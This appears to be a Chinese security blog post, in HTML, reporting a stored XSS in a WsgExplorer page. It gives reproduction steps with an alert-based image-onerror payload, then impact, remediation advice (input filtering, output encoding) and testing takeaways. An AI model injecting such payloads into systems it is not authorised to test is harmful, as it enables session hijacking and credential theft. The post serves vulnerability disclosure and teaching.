<pre><ol class="list-paddingleft-1" style="margin: 0px; padding: 10px 0px 10px 30px; color: transparent;"><li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px 0px 0px 1em; background-color: rgb(45, 45, 45);"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; display: block; line-height: 22px;"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; display: block;"><code><span><span>https</span></span><span><span>:</span></span><span><span>//[target]/wsg/Pages/WsgExplorer.aspx</span></span></code></span></span></li></ol></pre>
<hr />
<p>
 <strong style="font-weight: bold; color: rgb(0, 0, 0); margin-top: 0px;">
  <span>
   Steps to Reproduce
  </span>
 </strong>
</p>
<ol class="list-paddingleft-1">
 <li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;">
  <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
   <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
    <span>
     打开 WsgExplorer
    </span>
   </span>
  </span>
 </li>
 <li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;">
  <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
   <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
    <span>
     进入 Repositories
    </span>
   </span>
  </span>
 </li>
 <li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;">
  <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
   <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
    <span>
     创建：
    </span>
   </span>
  </span>
 </li>
</ol>
<pre><ol class="list-paddingleft-1" style="margin: 0px; padding: 10px 0px 10px 30px; color: transparent;"><li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px 0px 0px 1em; background-color: rgb(45, 45, 45);"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; display: block; line-height: 22px;"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; display: block;"><code><span><span>&lt;img</span></span><span><span>src</span></span><span><span>=</span></span><span><span>x</span></span><span><span>onerror</span></span><span><span>=</span></span><span><span>"</span></span><span><span>alert</span></span><span><span>(</span></span><span><span>'XSS'</span></span><span><span>)</span></span><span><span>"</span></span><span><span>&gt;</span></span></code></span></span></li></ol></pre>
<ol class="list-paddingleft-1">
 <li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;">
  <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
   <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
    <span>
     保存并刷新
    </span>
   </span>
  </span>
 </li>
 <li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;">
  <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
   <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
    <span>
     观察执行
    </span>
   </span>
  </span>
 </li>
</ol>
<hr />
<p>
 <strong style="font-weight: bold; color: rgb(0, 0, 0); margin-top: 0px;">
  <span>
   Proof of Concept
  </span>
 </strong>
</p>
<hr />
<p>
 <strong style="font-weight: bold; color: rgb(0, 0, 0); margin-top: 0px;">
  <span>
   Impact
  </span>
 </strong>
</p>
<p>
 <span>
  存储型 XSS，可导致：
 </span>
</p>
<ul class="list-paddingleft-1">
 <li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;">
  <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
   <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
    <span>
     会话劫持
    </span>
   </span>
  </span>
 </li>
 <li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;">
  <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
   <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
    <span>
     凭证窃取
    </span>
   </span>
  </span>
 </li>
 <li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;">
  <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
   <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
    <span>
     未授权 API 操作
    </span>
   </span>
  </span>
 </li>
</ul>
<hr />
<p>
 <strong style="font-weight: bold; color: rgb(0, 0, 0); margin-top: 0px;">
  <span>
   Remediation
  </span>
 </strong>
</p>
<ul class="list-paddingleft-1">
 <li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;">
  <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
   <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
    <span>
     存储时过滤输入
    </span>
   </span>
  </span>
 </li>
 <li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;">
  <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
   <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
    <span>
     渲染时编码输出
    </span>
   </span>
  </span>
 </li>
</ul>
<hr />
<h2>
 <span>
  Key Takeaways
 </span>
</h2>
<ol class="list-paddingleft-1">
 <li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;">
  <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
   <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
    <span>
     优先测试开发者工具（后台、API Explorer、内部系统）
    </span>
   </span>
  </span>
 </li>
 <li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;">
  <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
   <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
    <span>
     所有回显点都要测试
    </span>
   </span>
  </span>
 </li>
 <li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;">
  <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
   <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
    <span>
     存储型 XSS 优先级高于反射型
    </span>
   </span>
  </span>
 </li>
 <li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;">
  <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
   <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
    <span>
     部分过滤不等于安全
    </span>
   </span>
  </span>
 </li>
 <li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;">
  <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
   <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
    <span>
     使用 alert 即可证明漏洞存在
    </span>
   </span>
  </span>
 </li>
</ol>
<ul class="list-paddingleft-1">
 <li>
  <section>
   <img src="https://mmbiz.qpic.cn/sz_mmbiz_png/R98u9GTbBnujJsOQ6l5ZQiboicU5hx2kJBJan89Yrhxy4gAzwOHHEf58Jl3ibZvO9St1C34KJtyWfNGJCaGTEj2DbqQWzcibNwfWt0kDj3KCzQc/640?wx_fmt=png&amp;from=appmsg&amp;watermark=1&amp;wxfrom=5&amp;wx_lazy=1&amp;tp=webp#imgIndex=5" />
  </section>
  <section>
   <img src="https://mmbiz.qpic.cn/mmbiz_png/R98u9GTbBntbyeicq6hCKWBrLth0PueDSun6NVR4Whz6BSlYbVDaG4HdIRPUCWA7D793VlMBAc7heyj4KSI5BEiasEGTHIAVgGL9DrVSQNnk4/640?wx_fmt=png&amp;from=appmsg&amp;watermark=1&amp;wxfrom=5&amp;wx_lazy=1&amp;tp=webp#imgIndex=7" />
  </section>
  <section>
   <span>
    <br />
   </span>
  </section>
  <section>
   <img src="https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHYgfyicoHWcBVxH85UOBNaPZeRlpCaIfwnM0IM4vnVugkAyDFJlhe1Rkalbz0a282U9iaVU12iaEiahw/640?wx_fmt=other&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1&amp;randomid=z84f6pb5&amp;tp=webp#imgIndex=5" />
  </section>
  <p>
   <span>
    <br />
   </span>
  </p>
  <p>
   <span>
    <br />
   </span>
  </p>
  <p>
   <span>
    <br />
   </span>
  </p>
  <p>
   <strong>
   </strong>
  </p>
  <p>
   <span>
    <br />
   </span>
  </p>
 </li>
 <ul class="list-paddingleft-1">
  <li>
   <p>
    <span>
     公众号:安全狗的自我修养
    </span>
   </p>
  </li>
  <li>
   <p>
    <span>
     vx:2207344074
    </span>
   </p>
  </li>
  <li>
   <p>
    <span>
     <span>
      http://
     </span>
    </span>
    <span>
     gitee.com/haidragon
    </span>
   </p>
  </li>
  <li>
   <p>
    <span>
     <span>
      http://
     </span>
    </span>
    <span>
     github.com/haidragon
    </span>
   </p>
  </li>
  <li>
   <p>
    <span>
     bilibili:haidragonx
    </span>
   </p>
  </li>
 </ul>
 <ul class="list-paddingleft-1">
  <li>
   <section>
    <img src="https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHYgfyicoHWcBVxH85UOBNaPMJPjIWnCTP3EjrhOXhJsryIkR34mCwqetPF7aRmbhnxBbiaicS0rwu6w/640?wx_fmt=other&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1&amp;randomid=omk5zkfc&amp;tp=webp#imgIndex=5" />
   </section>
  </li>
 </ul>
</ul>
<section style="margin-bottom: 0px;">
 <span>
  <br />
 </span>
</section>
<p style="display: none;">
 
 
</p>
